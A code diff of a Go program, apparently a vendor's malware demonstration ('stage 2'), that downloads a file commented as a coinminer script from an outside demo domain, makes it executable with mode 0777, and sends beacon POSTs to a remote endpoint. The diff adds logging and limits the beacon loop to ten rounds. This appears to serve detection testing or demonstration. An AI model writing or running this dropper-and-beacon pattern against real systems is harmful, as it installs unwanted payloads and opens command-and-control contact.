@@ -1,82 +1,56 @@
 package main
 
 import (
-	"bytes"
-	"fmt"
-	"io"
-	"net/http"
+	"log"
 	"os"
 	"time"
 )
 
-func http_post(url string, jsonStr []byte) error {
-
-        req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonStr))
-        req.Header.Set("X-Custom-Header", "myvalue")
-        req.Header.Set("Content-Type", "application/json")
-
-        client := &http.Client{}
-        resp, err := client.Do(req)
-        if err != nil {
-                return err
-        }
-        defer resp.Body.Close()
-
-        return err
-}
-
-func http_get(url string, filename string) error {
-
-	resp, err := http.Get(url)
-	if err != nil {
-		return err
-	}
-	defer resp.Body.Close()
-
-	out, err := os.Create(filename)
-        if err != nil {
-                return err
-        }
-        defer out.Close()
-
-	_, err = io.Copy(out, resp.Body)
-	return err
-}
-
 func main() {
-
-	// define constants
 	const domain = "lwmalwaredemo.com"
-	const filename = "install-demo-1.sh"
+	//const domain = "localhost:8081"
 	const host = "lacework.ddns.net"
-
-	var post_url = "http://"+host+"/lw-beacon"
-	var get_url = "http://"+domain+"/"+filename
+	//const host = "localhost:8080"
+	const filename = "install-demo-1.sh"
+	const postUrl = "http://" + host + "/lw-beacon"
+	const getUrl = "http://" + domain + "/" + filename
 	var body = []byte(`{"stage":"2"}`)
 
+	f := setupLogger("lw-stage-2.log")
+	defer func(f *os.File) {
+		_ = f.Close()
+	}(f)
+	log.SetOutput(f)
+	log.Println("Stage 2 started")
+
 	// download coinminer script
-	fmt.Println("Downloading file: "+get_url)
-	get_err := http_get(get_url, filename)
-	if get_err != nil {
-		panic(get_err)
+	log.Println("Downloading file: " + getUrl)
+	getErr := httpGet(getUrl, filename)
+	if getErr != nil {
+		log.Println("Error downloading file", getErr)
+		panic(getErr)
 	}
 
 	// make file executable
-	chmod_err := os.Chmod(filename, 0777)
-	if chmod_err != nil {
-		panic(chmod_err)
+	chmodErr := os.Chmod(filename, 0777)
+	if chmodErr != nil {
+		log.Println("Error changing permissions", chmodErr)
+		panic(chmodErr)
 	}
-	fmt.Println("Done")
+	log.Println("Finished changing permissions for stage 2")
 
 	//wait a few seconds then terminate
 	time.Sleep(10 * time.Second)
 
-	// beacon home every 60 seconds forever
-	for {
-		post_err := http_post(post_url, body)
-		if post_err != nil {
-				panic(post_err)
+	// beacon home every 60 seconds 10 times
+	for i := range 10 {
+		postErr := httpPost(postUrl, body)
+		if postErr != nil {
+			log.Println("Error posting beacon to API", postErr)
+			panic(postErr)
 		}
+		log.Printf("Sending stage 2 beacon back to API: %d\n", i+1)
 		time.Sleep(60 * time.Second)
 	}
+	log.Println("Completed. Terminating.")
 }
